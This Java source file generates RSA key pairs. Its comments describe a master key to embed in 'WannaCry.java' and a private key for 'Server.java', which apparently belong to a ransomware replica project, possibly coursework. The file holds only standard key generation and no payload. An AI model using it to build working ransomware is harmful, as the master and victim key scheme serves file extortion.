import java.security.*;
import java.util.Base64;
import java.nio.file.*;

/**
 * Utility to generate RSA key pairs for testing.
 * Run once to generate master keys and user keys.
 * 
 * Usage: java KeyGen [userid]
 *   - No args: generates master keys (prints Base64 to console)
 *   - With userid: generates <userid>.pub and <userid>.prv files
 */
public class KeyGen {
    public static void main(String[] args) throws Exception {
        KeyPairGenerator keyGen = KeyPairGenerator.getInstance("RSA");
        keyGen.initialize(2048);
        KeyPair keyPair = keyGen.generateKeyPair();
        
        if (args.length == 0) {
            // Generate master keys - output as Base64 for embedding in code
            String publicKeyB64 = Base64.getEncoder().encodeToString(
                keyPair.getPublic().getEncoded());
            String privateKeyB64 = Base64.getEncoder().encodeToString(
                keyPair.getPrivate().getEncoded());
            
            System.out.println("=== MASTER PUBLIC KEY (embed in WannaCry.java) ===");
            System.out.println(publicKeyB64);
            System.out.println();
            System.out.println("=== MASTER PRIVATE KEY (save to master.prv) ===");
            System.out.println(privateKeyB64);
            
            // Also save private key to file for server
            Files.writeString(Paths.get("server-b64.prv"), privateKeyB64);
            System.out.println();
            System.out.println("Saved server-b64.prv file for Server.java");
        } else {
            // Generate user keys - save as raw bytes
            String userid = args[0];
            Files.write(Paths.get(userid + ".pub"), keyPair.getPublic().getEncoded());
            Files.write(Paths.get(userid + ".prv"), keyPair.getPrivate().getEncoded());
            System.out.println("Generated " + userid + ".pub and " + userid + ".prv");
        }
    }
}
